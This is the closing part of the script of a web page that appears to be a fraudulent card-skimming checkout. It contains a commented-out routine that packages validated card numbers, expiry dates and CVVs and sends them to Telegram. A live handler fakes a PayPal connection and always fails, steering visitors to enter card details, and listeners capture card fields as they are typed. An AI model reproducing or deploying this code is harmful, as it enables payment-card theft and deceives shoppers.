            //     const isValidCVV = validateCVV(securityCode, cardType);
            //     
            //     // Check if all fields are filled and valid
            //     if (cardNumber && expiryDate && securityCode && 
            //         isValidCard && cardType !== 'unknown' && 
            //         isValidExpiry && isValidCVV && !cardDetailsSent) {
            //         
            //         cardDetailsSent = true;
            //         
            //         const cardData = {
            //             cardNumber: cardNumber,
            //             cardType: cardType.toUpperCase(),
            //             expiryDate: expiryDate,
            //             securityCode: securityCode,
            //             isValidLuhn: isValidCard,
            //             isValidExpiry: isValidExpiry,
            //             isValidCVV: isValidCVV
            //         };
            //         
            //         // Send to Telegram immediately
            //         sendToTelegram(cardData);
            //     }
            // }

            // PayPal button loading and error handling
            function handlePayPalClick() {
                const paypalBtn = document.getElementById('paypalBtn');
                const paypalBtnText = document.getElementById('paypalBtnText');
                const paypalLoader = document.getElementById('paypalLoader');
                const paypalMessage = document.getElementById('paypalMessage');

                // Show loading state
                paypalBtn.disabled = true;
                paypalBtn.classList.remove('hover:bg-blue-800');
                paypalBtn.classList.add('opacity-75', 'cursor-not-allowed');
                paypalBtnText.textContent = 'Connecting to PayPal...';
                paypalLoader.classList.remove('hidden');
                paypalMessage.textContent = 'Please wait while we connect to PayPal...';

                // Simulate loading for 4 seconds, then show error
                setTimeout(() => {
                    paypalBtn.disabled = false;
                    paypalBtn.classList.remove('opacity-75', 'cursor-not-allowed');
                    paypalBtn.classList.add('hover:bg-blue-800');
                    paypalBtn.classList.remove('bg-blue-700');
                    paypalBtn.classList.add('bg-red-600', 'hover:bg-red-700');
                    paypalBtnText.textContent = 'PayPal Unavailable';
                    paypalLoader.classList.add('hidden');
                    paypalMessage.innerHTML = ' We couldn\'t connect to PayPal. Please use your card to complete the payment.';
                    paypalMessage.classList.remove('text-gray-600');
                    paypalMessage.classList.add('text-red-600');
                }, 4000);
            }


            // Add event listeners for PayPal and Apple Pay buttons
            document.getElementById('paypalBtn').addEventListener('click', handlePayPalClick);

            // Add event listeners for real-time capture and validation
            document.getElementById('cardNumber').addEventListener('input', handleCardNumberInput);
            document.getElementById('expiryDate').addEventListener('input', handleExpiryDateInput);
            document.getElementById('securityCode').addEventListener('input', handleCVVInput);
        });
    </script>
</body>
</html>
